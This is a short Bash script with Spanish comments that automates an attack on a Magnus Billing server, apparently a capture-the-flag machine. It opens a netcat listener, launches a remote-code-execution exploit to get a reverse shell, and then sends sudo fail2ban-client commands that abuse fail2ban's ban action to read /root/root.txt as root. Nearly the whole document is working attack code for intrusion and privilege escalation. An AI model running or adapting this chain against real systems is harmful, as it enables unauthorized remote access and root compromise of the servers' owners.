#!/bin/bash

# Script para obtener reverse shell y escalar a root en Magnus Billing

echo "[*] Iniciando listener..."
nc -lvnp 1337 &
NC_PID=$!
sleep 1

echo "[*] Enviando exploit RCE..."
python3 exploit_rce.py -t 'http://10.64.162.121/mbilling/' -lh 192.168.231.154 -lp 1337
sleep 2

echo "[*] Enviando comandos para escalar privilegios..."
# Comandos para enviar a través de la reverse shell
echo "sudo /usr/bin/fail2ban-client add rootshell" | nc -q 1 192.168.231.154 1337
sleep 1
echo "sudo /usr/bin/fail2ban-client set rootshell action 'actionban = cat /root/root.txt > /tmp/flag.txt; chmod 777 /tmp/flag.txt'" | nc -q 1 192.168.231.154 1337
sleep 1
echo "sudo /usr/bin/fail2ban-client set rootshell addlogpath /var/log/auth.log" | nc -q 1 192.168.231.154 1337
sleep 1
echo "sudo /usr/bin/fail2ban-client set rootshell addfailregex .*" | nc -q 1 192.168.231.154 1337
sleep 1
echo "sudo /usr/bin/fail2ban-client set rootshell banip 127.0.0.1" | nc -q 1 192.168.231.154 1337
sleep 2
echo "cat /tmp/flag.txt" | nc -q 1 192.168.231.154 1337

kill $NC_PID 2>/dev/null

echo "[*] Script completado"
